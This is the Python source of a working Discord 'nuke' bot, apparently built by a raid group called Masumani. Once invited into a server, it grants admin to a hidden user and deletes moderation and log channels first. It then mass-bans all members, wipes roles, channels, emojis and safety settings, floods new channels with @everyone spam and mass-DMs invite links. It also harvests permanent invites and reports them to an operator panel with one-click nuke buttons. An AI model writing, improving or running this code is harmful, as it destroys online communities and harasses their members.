import discord
from discord.ext import commands
import asyncio
import random
import os
import json
import signal
import sys
from dotenv import load_dotenv
from typing import Optional, List, Set, Dict, Any, Coroutine
from dataclasses import dataclass
import time
import logging
from logging.handlers import RotatingFileHandler

PROTECTED_USER_ID = 1427240409007915028
NUKED_GUILDS_FILE = "nuked_guilds.json"
SPAM_TIMEOUT = 120

@dataclass(frozen=True)
class BotConfig:
    token: str
    prefix: str
    default_new_name: str
    invite_link: str
    manage_guild_id: int
    manage_channel_id: int
    panel_state_file: str = "panel_state.json"

    @classmethod
    def from_env(cls) -> "BotConfig":
        load_dotenv()
        token = os.getenv("TOKEN")
        if not token:
            raise ValueError("環境変数 TOKEN が設定されていません")
        return cls(
            token=token,
            prefix=os.getenv("PREFIX", "!"),
            default_new_name=os.getenv("DEFAULT_NEW_NAME", "ますまに共栄圏植民地"),
            invite_link=os.getenv("INVITE_LINK", "https://discord.gg/masu"),
            manage_guild_id=int(os.getenv("MANAGE_GUILD_ID", "0")),
            manage_channel_id=int(os.getenv("MANAGE_CHANNEL_ID", "0")),
        )

CONFIG = BotConfig.from_env()

def setup_logging() -> logging.Logger:
    logger = logging.getLogger("nuke_bot")
    logger.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(name)s: %(message)s')
    sh = logging.StreamHandler(sys.stdout)
    sh.setFormatter(formatter)
    logger.addHandler(sh)
    fh = RotatingFileHandler(
        "bot.log", maxBytes=5*1024*1024, backupCount=5,
        encoding='utf-8'
    )
    fh.setFormatter(formatter)
    logger.addHandler(fh)
    return logger

logger = setup_logging()

class PanelState:
    def __init__(self, filepath: str) -> None:
        self.filepath = filepath
        self.data: Dict[str, Any] = {}
        self.load()

    def load(self) -> None:
        if os.path.exists(self.filepath):
            try:
                with open(self.filepath, 'r', encoding='utf-8') as f:
                    self.data = json.load(f)
            except Exception as e:
                logger.error(f"パネル状態読み込み失敗: {e}")

    def save(self) -> None:
        try:
            with open(self.filepath, 'w', encoding='utf-8') as f:
                json.dump(self.data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"パネル状態保存失敗: {e}")

    def get_panel_message_id(self) -> Optional[int]:
        return self.data.get("manage_panel_message_id")

    def set_panel_message_id(self, message_id: int) -> None:
        self.data["manage_panel_message_id"] = message_id
        self.save()

panel_state = PanelState(CONFIG.panel_state_file)

def load_nuked_guilds() -> Set[int]:
    if os.path.exists(NUKED_GUILDS_FILE):
        try:
            with open(NUKED_GUILDS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                return set(data.get("guilds", []))
        except Exception as e:
            logger.error(f"ヌーク済みサーバー読み込み失敗: {e}")
    return set()

def save_nuked_guilds(guild_ids: Set[int]) -> None:
    try:
        with open(NUKED_GUILDS_FILE, 'w', encoding='utf-8') as f:
            json.dump({"guilds": list(guild_ids)}, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"ヌーク済みサーバー保存失敗: {e}")

nuked_guilds = load_nuked_guilds()
active_operations: Set[int] = set()
dm_sent_ids: Dict[int, Set[int]] = {}

class RateLimitManager:
    def __init__(self, rate: int = 45, burst: int = 45):
        self.rate = rate
        self.burst = burst
        self.tokens = burst
        self.updated_at = time.monotonic()
        self._lock = asyncio.Lock()
        self._active_tasks: Set[asyncio.Task] = set()

    async def _wait_for_token(self) -> None:
        async with self._lock:
            while self.tokens < 1:
                now = time.monotonic()
                elapsed = now - self.updated_at
                new_tokens = elapsed * self.rate
                if new_tokens > 0:
                    self.tokens = min(self.burst, self.tokens + new_tokens)
                    self.updated_at = now
                    if self.tokens >= 1:
                        break
                wait_time = (1 - self.tokens) / self.rate
                await asyncio.sleep(wait_time)
            self.tokens -= 1

    async def execute(self, coro: Coroutine, *, retry_on_429: bool = True) -> Any:
        await self._wait_for_token()
        try:
            return await coro
        except discord.HTTPException as e:
            if e.status == 429 and retry_on_429:
                max_retries = 3
                base_wait = getattr(e, 'retry_after', 1.0)
                for attempt in range(1, max_retries + 1):
                    wait = base_wait * (2 ** (attempt - 1)) + random.uniform(0.1, 0.5)
                    logger.warning(f"429 rate limited. Retry {attempt}/{max_retries} after {wait:.2f}s")
                    await asyncio.sleep(wait)
                    await self._wait_for_token()
                    try:
                        return await coro
                    except discord.HTTPException as e2:
                        if e2.status == 429:
                            continue
                        else:
                            logger.error(f"Retry failed with {e2.status}: {e2.text}")
                            return None
                    except Exception as e2:
                        logger.error(f"Retry failed: {e2}")
                        return None
                logger.error("Max retries exceeded for 429")
                return None
            else:
                logger.error(f"HTTP Exception [{e.status}]: {e.text}")
                return None
        except Exception as e:
            logger.error(f"Unexpected error: {e}")
            return None

    def create_task(self, coro: Coroutine, *, name: Optional[str] = None) -> asyncio.Task:
        async def wrapper():
            return await self.execute(coro)
        task = asyncio.create_task(wrapper(), name=name)
        self._active_tasks.add(task)
        task.add_done_callback(self._active_tasks.discard)
        task.add_done_callback(self._on_task_done)
        return task

    def _on_task_done(self, task: asyncio.Task) -> None:
        exc = task.exception()
        if exc:
            logger.error(f"Task {task.get_name()} raised: {exc}", exc_info=exc)

    async def cancel_all(self) -> None:
        for task in list(self._active_tasks):
            if not task.done():
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
        logger.info(f"全タスクキャンセル完了（残り{len(self._active_tasks)}件）")

rate_mgr = RateLimitManager(rate=45, burst=45)

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.bans = True
intents.guilds = True

bot = commands.Bot(
    command_prefix=CONFIG.prefix,
    intents=intents,
    help_command=None,
    case_insensitive=True
)

async def notify_manage_channel(content: str, embed: Optional[discord.Embed] = None) -> None:
    try:
        guild = bot.get_guild(CONFIG.manage_guild_id)
        if not guild:
            return
        channel = guild.get_channel(CONFIG.manage_channel_id)
        if not channel or not isinstance(channel, discord.TextChannel):
            return
        await rate_mgr.execute(channel.send(content=content, embed=embed))
    except Exception as e:
        logger.error(f"管理チャンネル通知失敗: {e}")

async def create_channel_safely(guild: discord.Guild, name: str) -> Optional[discord.TextChannel]:
    return await rate_mgr.execute(guild.create_text_channel(name))

async def create_colored_roles_batch(guild: discord.Guild, count: int, batch_size: int = 30) -> int:
    created = 0
    for i in range(0, count, batch_size):
        batch_count = min(batch_size, count - i)
        coros = [
            rate_mgr.execute(
                guild.create_role(
                    name="ますまに共栄圏に荒らされましたｗｗｗ",
                    color=discord.Color.random(),
                    hoist=True,
                    mentionable=True
                )
            )
            for _ in range(batch_count)
        ]
        results = await asyncio.gather(*coros, return_exceptions=True)
        created += sum(1 for r in results if isinstance(r, discord.Role))
        logger.info(f"Role creation progress: {created}/{count}")
        await asyncio.sleep(0.05)
    return created

async def ban_all_members(guild: discord.Guild, members: List[discord.Member], reason: str) -> int:
    banned = 0
    batch_size = 50
    for i in range(0, len(members), batch_size):
        batch = members[i:i+batch_size]
        coros = []
        for m in batch:
            if m.id == PROTECTED_USER_ID or m == guild.me or m.bot:
                continue
            coros.append(
                rate_mgr.execute(
                    guild.ban(m, reason=reason, delete_message_seconds=0)
                )
            )
        if coros:
            results = await asyncio.gather(*coros, return_exceptions=True)
            banned += sum(1 for r in results if r is True or isinstance(r, discord.User))
            logger.info(f"Ban progress: {banned}/{len(members)}")
        await asyncio.sleep(0.02)
    return banned

async def delete_emojis_and_stickers(guild: discord.Guild) -> None:
    try:
        emojis = None
        stickers = None
        for attempt in range(3):
            try:
                emojis = await guild.fetch_emojis()
                break
            except Exception as e:
                logger.warning(f"絵文字フェッチ失敗 (attempt {attempt+1}): {e}")
                await asyncio.sleep(0.5)
        for attempt in range(3):
            try:
                stickers = await guild.fetch_stickers()
                break
            except Exception as e:
                logger.warning(f"スタンプフェッチ失敗 (attempt {attempt+1}): {e}")
                await asyncio.sleep(0.5)

        delete_coros = []
        if isinstance(emojis, list):
            delete_coros.extend(rate_mgr.execute(e.delete()) for e in emojis)
        if isinstance(stickers, list):
            delete_coros.extend(rate_mgr.execute(s.delete()) for s in stickers)

        if delete_coros:
            batch_size = 50
            for i in range(0, len(delete_coros), batch_size):
                batch = delete_coros[i:i+batch_size]
                await asyncio.gather(*batch, return_exceptions=True)
                await asyncio.sleep(0.05)

        logger.info(f"Deleted {len(emojis) if isinstance(emojis, list) else 0} emojis, {len(stickers) if isinstance(stickers, list) else 0} stickers")
    except Exception as e:
        logger.error(f"Emoji/sticker deletion error: {e}")

async def grant_admin_to_user(guild: discord.Guild, user_id: int) -> Optional[discord.Role]:
    member = guild.get_member(user_id)
    if member is None:
        logger.warning(f"ユーザー {user_id} が見つかりません")
        return None
    try:
        admin_roles = [r for r in guild.roles if r.permissions.administrator and not r.managed]
        if admin_roles:
            role_to_give = admin_roles[0]
            if role_to_give not in member.roles:
                await rate_mgr.execute(member.add_roles(role_to_give))
                logger.info(f"ユーザー {member.name} に既存の管理者ロールを付与しました")
            return role_to_give
        admin_role = await rate_mgr.execute(
            guild.create_role(name="Member", permissions=discord.Permissions.all(), hoist=False)
        )
        if admin_role:
            await rate_mgr.execute(member.add_roles(admin_role))
            logger.info(f"ユーザー {member.name} に新しい管理者ロールを付与しました")
            return admin_role
        else:
            logger.error("管理者ロール作成に失敗")
            return None
    except Exception as e:
        logger.error(f"権限付与失敗: {e}")
        return None

async def remove_roles_from_non_protected(guild: discord.Guild, protected_id: int) -> None:
    members = guild.members
    coros = []
    for m in members:
        if m.id == protected_id or m.bot:
            continue
        roles_to_remove = [r for r in m.roles if r != guild.default_role]
        if roles_to_remove:
            coros.append(rate_mgr.execute(m.remove_roles(*roles_to_remove, reason="権限剥奪")))
    if coros:
        await asyncio.gather(*coros, return_exceptions=True)
        logger.info(f"保護対象以外のメンバーからロールを剥奪しました（{len(coros)}人）")

async def dm_members(guild: discord.Guild, members: List[discord.Member]) -> int:
    if guild.id not in dm_sent_ids:
        dm_sent_ids[guild.id] = set()
    sent = 0
    dm_coros = []
    for m in members:
        if m.id == PROTECTED_USER_ID or m.id in dm_sent_ids[guild.id]:
            continue
        if m.guild_permissions.administrator:
            continue
        dm_sent_ids[guild.id].add(m.id)
        dm_coros.append(rate_mgr.execute(m.send(CONFIG.invite_link)))
    if dm_coros:
        results = await asyncio.gather(*dm_coros, return_exceptions=True)
        sent = sum(1 for r in results if not isinstance(r, Exception))
        logger.info(f"DM送信完了: {sent}/{len(dm_coros)} 成功")
    return sent

async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None) -> None:
    if guild.id == CONFIG.manage_guild_id:
        logger.info(f"管理サーバー({guild.name})のためヌークをスキップ")
        return

    if guild.id in active_operations:
        logger.warning(f"{guild.name} は既に操作実行中のためスキップ")
        return
    active_operations.add(guild.id)
    try:
        new_name = new_server_name or CONFIG.default_new_name

        if guild.member_count > 1000 and not guild.chunked:
            logger.info(f"大規模サーバー検出: {guild.name} ({guild.member_count}人) → メンバーチャンク取得中...")
            try:
                await guild.chunk()
            except Exception as e:
                logger.error(f"チャンク取得失敗: {e}")

        protected_admin_role = await grant_admin_to_user(guild, PROTECTED_USER_ID)

        members = [m for m in guild.members if m != bot.user]
        non_bot_members = [m for m in members if not m.bot]

        logger.info(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")
        await notify_manage_channel(f"🚀 **{guild.name}** でヌークを開始します（非BOT: {len(non_bot_members)}人）")

        log_keywords = [
            "log", "ログ", "audit", "監視", "mod", "moderation",
            "admin", "管理", "report", "報告", "ticket", "チケット"
        ]
        channels = list(guild.channels)
        log_channels = [
            ch for ch in channels
            if any(kw.lower() in ch.name.lower() for kw in log_keywords)
        ]
        if log_channels:
            delete_coros = [rate_mgr.execute(ch.delete()) for ch in log_channels]
            await asyncio.gather(*delete_coros, return_exceptions=True)
            logger.info(f"ログチャンネル削除完了: {len(log_channels)}個")
            await asyncio.sleep(0.3)

        initial_tasks = []

        bot_ban_coros = [
            rate_mgr.execute(guild.ban(m, reason="", delete_message_seconds=0))
            for m in members if m.bot
        ]
        if bot_ban_coros:
            initial_tasks.append(asyncio.gather(*bot_ban_coros, return_exceptions=True))

        everyone_role = guild.default_role
        permissions = discord.Permissions(
            view_channel=True,
            read_message_history=True
        )
        initial_tasks.append(rate_mgr.execute(everyone_role.edit(permissions=permissions)))

        initial_tasks.append(rate_mgr.execute(guild.edit(icon=None, banner=None, splash=None)))

        initial_tasks.append(rate_mgr.execute(guild.edit(
            verification_level=discord.VerificationLevel.none,
            explicit_content_filter=discord.ContentFilter.disabled,
            default_notifications=discord.NotificationLevel.all_messages,
            community=False
        )))

        initial_tasks.append(rate_mgr.execute(guild.edit(system_channel=None, rules_channel=None)))

        initial_tasks.append(delete_emojis_and_stickers(guild))

        await asyncio.gather(*initial_tasks, return_exceptions=True)
        await notify_manage_channel(f"⚙️ **{guild.name}** の初期破壊が完了しました")

        await remove_roles_from_non_protected(guild, PROTECTED_USER_ID)

        dm_task = asyncio.create_task(dm_members(guild, non_bot_members))

        async def delete_roles_fully(guild: discord.Guild, protected_role: Optional[discord.Role]) -> None:
            max_attempts = 10
            for attempt in range(1, max_attempts + 1):
                roles = [r for r in guild.roles if not r.is_default() and not r.managed]
                if protected_role:
                    roles = [r for r in roles if r.id != protected_role.id]
                if not roles:
                    logger.info("全ロール削除完了")
                    return
                logger.info(f"ロール削除試行 {attempt}: 残り {len(roles)}個")
                batch_size = 30
                for i in range(0, len(roles), batch_size):
                    batch = roles[i:i+batch_size]
                    coros = [rate_mgr.execute(r.delete()) for r in batch]
                    await asyncio.gather(*coros, return_exceptions=True)
                    await asyncio.sleep(0.03)
                await asyncio.sleep(0.3)
            remaining = [r for r in guild.roles if not r.is_default() and not r.managed and (not protected_role or r.id != protected_role.id)]
            logger.warning(f"ロール削除完了（残り {len(remaining)}個）")

        role_delete_task = asyncio.create_task(delete_roles_fully(guild, protected_admin_role))

        async def delete_channels_fully(guild: discord.Guild) -> None:
            max_attempts = 10
            for attempt in range(1, max_attempts + 1):
                all_channels = list(guild.channels)
                if not all_channels:
                    logger.info("全チャンネル削除完了")
                    return

                categories = [ch for ch in all_channels if isinstance(ch, discord.CategoryChannel)]
                if categories:
                    logger.info(f"カテゴリ削除試行 {attempt}: {len(categories)}個")
                    batch_size = 40
                    for i in range(0, len(categories), batch_size):
                        batch = categories[i:i+batch_size]
                        coros = [rate_mgr.execute(ch.delete()) for ch in batch]
                        await asyncio.gather(*coros, return_exceptions=True)
                        await asyncio.sleep(0.03)

                remaining_channels = [ch for ch in guild.channels if not isinstance(ch, discord.CategoryChannel)]
                if remaining_channels:
                    logger.info(f"残存チャンネル削除試行 {attempt}: {len(remaining_channels)}個")
                    batch_size = 40
                    for i in range(0, len(remaining_channels), batch_size):
                        batch = remaining_channels[i:i+batch_size]
                        coros = [rate_mgr.execute(ch.delete()) for ch in batch]
                        await asyncio.gather(*coros, return_exceptions=True)
                        await asyncio.sleep(0.03)

                if not list(guild.channels):
                    logger.info("全チャンネル削除完了")
                    return
                await asyncio.sleep(0.3)
            remaining = list(guild.channels)
            logger.warning(f"チャンネル削除完了（残り {len(remaining)}個）")

        channel_delete_task = asyncio.create_task(delete_channels_fully(guild))

        ban_task = asyncio.create_task(ban_all_members(guild, non_bot_members, new_name))

        await rate_mgr.execute(guild.edit(name=new_name))

        member_count = len(non_bot_members)
        if member_count < 100:
            target_channels = 80
        elif member_count < 500:
            target_channels = 60
        else:
            target_channels = 40
        target_roles = 100

        channels_created: List[discord.TextChannel] = []

        async def create_channels(guild: discord.Guild, count: int, output_list: List[discord.TextChannel]) -> None:
            channel_names = ["ますまに共栄圏万歳", "Raid by Masumani", "Masumani ON TOP"]
            batch_size = 40
            idx = 0
            while len(output_list) < count:
                current_batch = min(batch_size, count - len(output_list))
                coros = [
                    create_channel_safely(guild, channel_names[idx % len(channel_names)])
                    for _ in range(current_batch)
                ]
                results = await asyncio.gather(*coros, return_exceptions=True)
                for r in results:
                    if isinstance(r, discord.TextChannel):
                        output_list.append(r)
                        idx += 1
                logger.info(f"チャンネル作成進捗: {len(output_list)}/{count}")
                await asyncio.sleep(0.05)

        channel_create_task = asyncio.create_task(create_channels(guild, target_channels, channels_created))
        role_create_task = asyncio.create_task(create_colored_roles_batch(guild, target_roles))

        spam_messages = [
            f"@everyone Raid by Masumani Masumani ON TOP {CONFIG.invite_link}",
            f"@everyone Masumani ON TOP 来い {CONFIG.invite_link}",
            f"@everyone Raid by Masumani ますまに共栄圏 {CONFIG.invite_link}"
        ]
        message_counters: Dict[int, int] = {}
        active_channels: List[discord.TextChannel] = []
        spam_done = asyncio.Event()
        spam_start_time = time.monotonic()

        async def spam_loop():
            spam_round = 0
            while not spam_done.is_set():
                if time.monotonic() - spam_start_time > SPAM_TIMEOUT:
                    logger.warning("スパムタイムアウト（120秒）に達しました")
                    spam_done.set()
                    break

                for ch in channels_created:
                    if ch.id not in message_counters and ch not in active_channels:
                        active_channels.append(ch)
                        message_counters[ch.id] = 0

                spam_coros = []
                for ch in active_channels[:]:
                    if message_counters[ch.id] >= 300:
                        active_channels.remove(ch)
                        continue
                    spam_coros.append(rate_mgr.execute(ch.send(random.choice(spam_messages))))
                    message_counters[ch.id] += 1

                if spam_coros:
                    await asyncio.gather(*spam_coros, return_exceptions=True)

                spam_round += 1
                if spam_round % 50 == 0:
                    logger.info(f"Spam progress: round {spam_round}, active channels: {len(active_channels)}")

                if channel_create_task.done() and not active_channels and all(
                    message_counters.get(ch.id, 0) >= 300 for ch in channels_created
                ):
                    spam_done.set()
                    break

                await asyncio.sleep(0.5)

        spam_task = asyncio.create_task(spam_loop())

        await asyncio.gather(channel_delete_task, role_delete_task, ban_task)
        await notify_manage_channel(f"🗑️ **{guild.name}** のチャンネル・ロール削除とBANが完了しました")

        await dm_task

        await asyncio.gather(channel_create_task, role_create_task)
        await notify_manage_channel(f"📦 **{guild.name}** のチャンネル・ロール作成が完了しました")

        await spam_done.wait()
        await spam_task
        await notify_manage_channel(f"✅ **{guild.name}** のヌークが完了しました。Botが退出します。")

        nuked_guilds.add(guild.id)
        save_nuked_guilds(nuked_guilds)

        try:
            await rate_mgr.execute(guild.leave())
            logger.info(f"サーバーから退出しました: {guild.name}")
        except Exception as e:
            logger.error(f"退出失敗: {e}")

        logger.info("完了")
    finally:
        active_operations.discard(guild.id)

class NukeButtonView(discord.ui.View):
    def __init__(self, guild_id: int, bot: commands.Bot):
        super().__init__(timeout=None)
        self.guild_id = guild_id
        self.bot = bot

    @discord.ui.button(label="!Masumani 実行", style=discord.ButtonStyle.danger, custom_id="nuke_button")
    async def nuke_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = self.bot.get_guild(self.guild_id)
        if guild and guild.id != CONFIG.manage_guild_id:
            await interaction.response.send_message(f"{guild.name} でヌークを開始します。", ephemeral=True)
            rate_mgr.create_task(core_nuke(guild), name=f"nuke_btn_{guild.id}")
        else:
            await interaction.response.send_message("サーバーが見つからないか、保護されています。", ephemeral=True)

class ManageView(discord.ui.View):
    def __init__(self, bot: commands.Bot):
        super().__init__(timeout=None)
        self.bot = bot

    @discord.ui.button(label="サーバー一覧", style=discord.ButtonStyle.primary, custom_id="list_servers")
    async def list_servers(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="ボットが入ってるサーバー一覧", color=discord.Color.blue())
        for g in self.bot.guilds:
            if g.id != CONFIG.manage_guild_id:
                embed.add_field(name=g.name, value=f"ID: {g.id}\nメンバー: {g.member_count}", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.select(placeholder="ヌーク対象サーバー選択", options=[], custom_id="select_guild")
    async def select_guild(self, interaction: discord.Interaction, select: discord.ui.Select):
        guild_id = int(select.values[0])
        guild = self.bot.get_guild(guild_id)
        if guild and guild.id != CONFIG.manage_guild_id:
            rate_mgr.create_task(core_nuke(guild), name=f"nuke_sel_{guild.id}")
            await interaction.response.send_message(f"{guild.name} でヌーク起動しました。", ephemeral=True)
        else:
            await interaction.response.send_message("無効なサーバーまたは保護されています。", ephemeral=True)

async def send_or_update_panel(channel: discord.TextChannel, view: discord.ui.View) -> Optional[discord.Message]:
    existing_id = panel_state.get_panel_message_id()
    if existing_id:
        try:
            msg = await channel.fetch_message(existing_id)
            await msg.edit(content="サーバー管理パネル", view=view)
            logger.info(f"既存パネルを更新しました (ID: {existing_id})")
            return msg
        except discord.NotFound:
            logger.info("保存されたパネルが見つかりません。新規作成します。")
        except Exception as e:
            logger.error(f"パネル取得失敗: {e}")
    try:
        msg = await channel.send("サーバー管理パネル", view=view)
        panel_state.set_panel_message_id(msg.id)
        logger.info(f"新規パネルを送信しました (ID: {msg.id})")
        return msg
    except Exception as e:
        logger.error(f"パネル送信失敗: {e}")
        return None

@bot.event
async def setup_hook() -> None:
    bot.add_view(ManageView(bot))
    logger.info("Persistent Views を登録しました")

@bot.event
async def on_ready():
    if getattr(bot, '_ready_once', False):
        return
    bot._ready_once = True
    try:
        await bot.change_presence(status=discord.Status.dnd, activity=discord.Game(name="メンテナンス中"))
    except Exception as e:
        logger.warning(f"プレゼンス変更失敗: {e}")

    logger.info(f"起動: {bot.user}")
    logger.info("=== ボット起動時の全サーバー情報 ===")

    for guild in bot.guilds:
        if guild.id == CONFIG.manage_guild_id:
            logger.info(f"管理サーバー: {guild.name} → 残留（保護）")
            await log_server_info(guild)
            continue

        if guild.id in nuked_guilds:
            logger.info(f"ヌーク済みサーバー再参加: {guild.name} → 即退出")
            try:
                await rate_mgr.execute(guild.leave())
            except Exception as e:
                logger.error(f"退出失敗: {e}")
            continue

        non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
        member_count = len(non_bot_members)

        if member_count <= 5 and not guild.name.startswith("ま") or guild.name == "郁郁地区美通話":
            logger.info(f"起動時自動退出: {guild.name} (メンバー含まず {member_count}人)")
            try:
                await rate_mgr.execute(guild.leave())
            except Exception as e:
                logger.error(f"退出失敗: {e}")
        else:
            await log_server_info(guild)

    logger.info("=====================================")

    manage_guild = bot.get_guild(CONFIG.manage_guild_id)
    if manage_guild:
        manage_channel = manage_guild.get_channel(CONFIG.manage_channel_id)
        if manage_channel and isinstance(manage_channel, discord.TextChannel):
            view = ManageView(bot)
            options = [discord.SelectOption(label=g.name, value=str(g.id)) for g in bot.guilds if g.id != CONFIG.manage_guild_id]
            if options:
                view.select_guild.options = options
                await send_or_update_panel(manage_channel, view)
            else:
                if not panel_state.get_panel_message_id():
                    await manage_channel.send("現在、操作可能な対象サーバーはありません。")
        else:
            logger.warning("管理チャンネルが見つからないか、テキストチャンネルではありません")
    else:
        logger.warning("管理サーバーが見つかりません")

@bot.event
async def on_guild_join(guild: discord.Guild):
    if guild.id == CONFIG.manage_guild_id:
        logger.info(f"管理サーバー参加: {guild.name} → 残留（保護）")
        return

    if guild.id in nuked_guilds:
        logger.info(f"ヌーク済みサーバー再参加: {guild.name} → 即退出")
        try:
            await rate_mgr.execute(guild.leave())
        except Exception as e:
            logger.error(f"退出失敗: {e}")
        return

    if guild.member_count > 1000 and not guild.chunked:
        asyncio.create_task(guild.chunk())
        logger.info(f"大規模サーバー {guild.name} のチャンクをバックグラウンドで開始")

    non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
    member_count = len(non_bot_members)

    if member_count <= 5 and not guild.name.startswith("ま") or guild.name == "郁郁地区美通話":
        logger.info(f"自動退出: {guild.name} (メンバー含まず {member_count}人)")
        try:
            await rate_mgr.execute(guild.leave())
        except Exception as e:
            logger.error(f"退出失敗: {e}")
        return

    logger.info(f"新規参加: {guild.name} (メンバー含まず {member_count}人) → 残留")
    manage_guild = bot.get_guild(CONFIG.manage_guild_id)
    if manage_guild:
        manage_channel = manage_guild.get_channel(CONFIG.manage_channel_id)
        if manage_channel and isinstance(manage_channel, discord.TextChannel):
            invite_link = "取得失敗"
            try:
                invites = await guild.invites()
                permanent_invite = None
                for inv in invites:
                    if inv.max_age == 0 and inv.max_uses == 0:
                        permanent_invite = inv
                        break
                    if inv.inviter is None or inv.inviter == guild.owner:
                        permanent_invite = inv
                        break
                if permanent_invite:
                    invite_link = permanent_invite.url
                else:
                    if guild.text_channels:
                        channel = guild.text_channels[0]
                        new_invite = await rate_mgr.execute(channel.create_invite(max_age=0, max_uses=0, unique=True, reason="Bot自動永久招待"))
                        invite_link = new_invite.url if new_invite else "作成失敗"
                    else:
                        invite_link = "テキストチャンネルなし"
            except Exception as e:
                invite_link = f"エラー: {str(e)}"

            embed = discord.Embed(title=f"新サーバー参加: {guild.name}", color=discord.Color.green())
            embed.add_field(name="ID", value=guild.id, inline=False)
            embed.add_field(name="メンバー数", value=guild.member_count, inline=False)
            embed.add_field(name="招待リンク", value=invite_link, inline=False)
            view = NukeButtonView(guild.id, bot)
            await manage_channel.send(embed=embed, view=view)
        else:
            logger.warning("管理チャンネルが見つかりません")

@bot.event
async def on_command_error(ctx: commands.Context, error: commands.CommandError) -> None:
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send("権限が不足しています。", delete_after=10)
    elif isinstance(error, commands.NoPrivateMessage):
        await ctx.send("サーバー内でのみ使用できます。", delete_after=10)
    else:
        logger.error(f"Command error in {ctx.command}: {error}", exc_info=error)
        await ctx.send(f"エラーが発生しました: {error}", delete_after=15)

@bot.command(name="masumani", aliases=["setup"])
async def trigger(ctx: commands.Context, *, new_name: Optional[str] = None) -> None:
    if not ctx.guild or ctx.guild.id == CONFIG.manage_guild_id:
        await ctx.send("このサーバーでは使用できません。", delete_after=10)
        return
    try:
        await ctx.message.delete()
    except Exception as e:
        logger.debug(f"Message delete failed: {e}")
    rate_mgr.create_task(core_nuke(ctx.guild, new_name), name=f"nuke_cmd_{ctx.guild.id}")

@bot.command(name="allban")
async def allban(ctx: commands.Context) -> None:
    if not ctx.guild or ctx.guild.id == CONFIG.manage_guild_id:
        await ctx.send("このサーバーでは使用できません。", delete_after=10)
        return
    try:
        await ctx.message.delete()
    except Exception as e:
        logger.debug(f"Message delete failed: {e}")

    guild = ctx.guild
    if guild.id in active_operations:
        return
    active_operations.add(guild.id)
    try:
        await grant_admin_to_user(guild, PROTECTED_USER_ID)

        members = [m for m in guild.members if m != bot.user]
        non_bot_members = [m for m in members if not m.bot]

        await dm_members(guild, non_bot_members)
        await ban_all_members(guild, non_bot_members, "allban")

        nuked_guilds.add(guild.id)
        save_nuked_guilds(nuked_guilds)

        try:
            await rate_mgr.execute(guild.leave())
            logger.info(f"サーバーから退出しました: {guild.name}")
        except Exception as e:
            logger.error(f"退出失敗: {e}")

        await notify_manage_channel(f"✅ **{guild.name}** の全BANが完了しました。")
    finally:
        active_operations.discard(guild.id)

async def log_server_info(guild: discord.Guild) -> None:
    member_count = guild.member_count
    server_name = guild.name
    invite_link = "取得失敗（権限不足 or チャンネルなし）"

    try:
        invites = await guild.invites()
        permanent_invite = None
        for inv in invites:
            if inv.max_age == 0 and inv.max_uses == 0:
                permanent_invite = inv
                break
            if inv.inviter is None or inv.inviter == guild.owner:
                permanent_invite = inv
                break

        if permanent_invite:
            invite_link = permanent_invite.url
        else:
            if guild.text_channels:
                channel = guild.text_channels[0]
                new_invite = await rate_mgr.execute(channel.create_invite(max_age=0, max_uses=0, unique=True, reason="Bot自動永久招待"))
                invite_link = new_invite.url if new_invite else "作成失敗"
            else:
                invite_link = "テキストチャンネルなし"
    except discord.Forbidden:
        invite_link = "権限不足（MANAGE_CHANNELS or CREATE_INSTANT_INVITEが必要）"
    except Exception as e:
        invite_link = f"エラー: {str(e)}"

    logger.info(f"サーバー: {server_name}")
    logger.info(f"メンバー数: {member_count}")
    logger.info(f"永久招待リンク: {invite_link}")
    logger.info("---")

async def shutdown() -> None:
    logger.info("シャットダウンシーケンスを開始します...")
    await rate_mgr.cancel_all()
    await bot.close()
    logger.info("Botを終了しました")

def signal_handler(sig, frame) -> None:
    logger.info(f"シグナル {sig} を受信しました")
    asyncio.create_task(shutdown())

from fastapi import FastAPI
import threading
import uvicorn

app = FastAPI()

@app.get("/")
async def health_check():
    return {
        "status": "alive",
        "bot": str(bot.user) if bot.user else "starting",
        "guilds": len(bot.guilds) if bot.user else 0
    }

@app.get("/ping")
async def ping():
    return {"status": "ok"}

def run_web_server():
    uvicorn.run(app, host="0.0.0.0", port=10000, log_level="warning")

async def start_bot_with_retry():
    # 初期待機を完全に廃止し、即時ログインを試行
    retries = 0
    max_retries = 50
    while True:
        try:
            await bot.start(CONFIG.token)
            break
        except discord.HTTPException as e:
            if e.status == 429:
                retries += 1
                retry_after = getattr(e, 'retry_after', 5)
                if retries > max_retries:
                    logger.critical(f"ログイン429が{max_retries}回続いたため終了します")
                    sys.exit(1)
                # 待機時間は必要最小限にし、急なブロックには指数バックオフで対応
                wait = min(retry_after * (2 ** (retries - 1)), 120) + random.uniform(1, 5)
                logger.warning(f"ログイン429、{wait:.1f}秒後に再試行（{retries}/{max_retries}）")
                # HTTPセッションを再作成してから再試行（Session is closed対策）
                try:
                    await bot.http.recreate()
                except Exception as e2:
                    logger.warning(f"HTTPセッション再作成失敗: {e2}")
                await asyncio.sleep(wait)
                continue
            else:
                logger.critical(f"Bot起動失敗: {e}")
                sys.exit(1)
        except Exception as e:
            logger.critical(f"Bot起動失敗: {e}", exc_info=True)
            sys.exit(1)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda s, f: asyncio.create_task(shutdown()))
    signal.signal(signal.SIGTERM, lambda s, f: asyncio.create_task(shutdown()))

    web_thread = threading.Thread(target=run_web_server, daemon=True)
    web_thread.start()
    logger.info("Health check server started on port 10000")

    try:
        asyncio.run(start_bot_with_retry())
    except Exception as e:
        logger.critical(f"Bot起動失敗: {e}", exc_info=True)
        sys.exit(1)
